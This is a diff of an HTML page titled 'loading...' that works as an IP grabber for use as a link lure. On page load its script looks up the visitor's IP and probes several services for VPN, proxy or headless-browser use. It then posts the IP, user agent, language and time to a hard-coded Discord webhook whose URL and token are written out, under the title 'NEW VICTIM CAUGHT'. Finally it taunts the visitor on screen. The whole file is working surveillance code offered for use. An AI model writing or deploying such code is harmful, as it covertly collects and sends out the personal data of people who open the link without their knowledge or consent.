@@ -2,72 +2,77 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>loading...</title>
   <style>body{background:#000;color:#0f0;font-family:monospace;}</style>
 </head>
 <body>
-  <pre id="out">gr4bb1ng & 53nd1ng y0ur d3741l5... plz w41t</pre>
+  <pre id="out">gr4bb1ng y0ur d474... plz w41t</pre>
 
   <script>
   (async () => {
-    const webhook = "https://discord.com/api/webhooks/1320147513130487869/YnYrrcuExZ0X_wG0I_Xeief6wh7D7_sDxaEftkPjlviv124TP5N0ESyJH4XQsAQn7KX3";
     const out = document.getElementById('out');
+    const webhook = "https://discord.com/api/webhooks/1320147513130487869/YnYrrcuExZ0X_wG0I_Xeief6wh7D7_sDxaEftkPjlviv124TP5N0ESyJH4XQsAQn7KX3";
+    
+    let ip = 'n0 1p';
+    let isVpn = 'unknown';
+    let isBot = 'unknown';
 
-    const getIP = async () => {
-      const apis = [
-        'https://api.ipify.org?format=json',
-        'https://api64.ipify.org?format=json',
-        'https://icanhazip.com/',
-        'https://ipwho.is/'
-      ];
-      for (const url of apis) {
-        try {
-          const r = await fetch(url, {cache:'no-store'});
-          if (url.includes('ipify')) return (await r.json()).ip;
-          if (url.includes('icanhazip')) return (await r.text()).trim();
-          if (url.includes('ipwho')) {
-            const d = await r.json();
-            return `\( {d.ip} ( \){d.city||'?'} ${d.region||'?'} ${d.country||'?'})`;
-          }
-        } catch {}
-      }
-      return 'c0uld n07 gr4b 1p';
-    };
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      ip = data.ip;
+    } catch {}
 
-    const ip = await getIP();
-    const ua = navigator.userAgent;
-    const lang = navigator.language || navigator.userLanguage;
-    const screen = `\( {screen.width}x \){screen.height}`;
-    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const time = new Date().toISOString();
+    const vpnChecks = [
+      `https://ipinfo.io/${ip}/json`,
+      'https://ipapi.co/json/',
+      'https://freeipapi.com/api/json'
+    ];
+
+    for (const url of vpnChecks) {
+      try {
+        const r = await fetch(url);
+        const d = await r.json();
+        if (d.privacy?.vpn || d.privacy?.proxy || d.privacy?.hosting || d.proxy || d.vpn) {
+          isVpn = 'YES (VPN/PROXY/HOSTING)';
+          break;
+        }
+        if (!d.city || d.asn?.includes('CLOUDFLARE')) {
+          isBot = 'POSSIBLE BOT/SCRAPER';
+        }
+      } catch {}
+    }
+
+    if (navigator.webdriver || !navigator.plugins.length) {
+      isBot = 'YES (HEADLESS/WEBDRIVER)';
+    }
 
     const payload = {
+      content: null,
       embeds: [{
-        title: "n3w v1c71m h1t",
+        title: "NEW VICTIM CAUGHT",
         color: 0x00ff00,
         fields: [
-          {name: "IP", value: `\`${ip}\``, inline: true},
-          {name: "Time", value: time, inline: true},
-          {name: "User-Agent", value: `\`\`\`${ua.substring(0,500)}\`\`\``, inline: false},
-          {name: "Language", value: lang, inline: true},
-          {name: "Screen", value: screen, inline: true},
-          {name: "Timezone", value: tz, inline: true}
+          {name: "IP", value: ip, inline: true},
+          {name: "VPN?", value: isVpn, inline: true},
+          {name: "BOT?", value: isBot, inline: true},
+          {name: "User-Agent", value: navigator.userAgent.slice(0,100)+"...", inline: false},
+          {name: "Language", value: navigator.language, inline: true},
+          {name: "Time", value: new Date().toISOString(), inline: true}
         ],
-        footer: {text: "d0n7 cl0s3 y37 k1dd0 ツ"}
+        footer: { text: "grabbed via link • " + location.hostname }
       }]
     };
 
-    try {
-      await fetch(webhook, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify(payload)
-      });
-      out.textContent = 'd3741l5 53n7 2 d15c0rd ツ\nthx f0r th3 d474';
-    } catch (e) {
-      out.textContent = `53nd f41l3d: \( {e.message}\n \){ip} w45 gr4bb3d but n07 53n7`;
-    }
+    // 53nd t0 d15c0rd w3bh00k
+    fetch(webhook, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify(payload)
+    }).catch(() => {});
+
+    // 5h0w 0n p4g3 t00
+    out.innerHTML = `0WN3D!\n\nIP → ${ip}\nVPN? → ${isVpn}\nBOT? → ${isBot}\nUA → ${navigator.userAgent}\nTime → ${new Date().toISOString()}\n\nh4v3 fun k1dd0 ツ`;
   })();
   </script>
 </body>
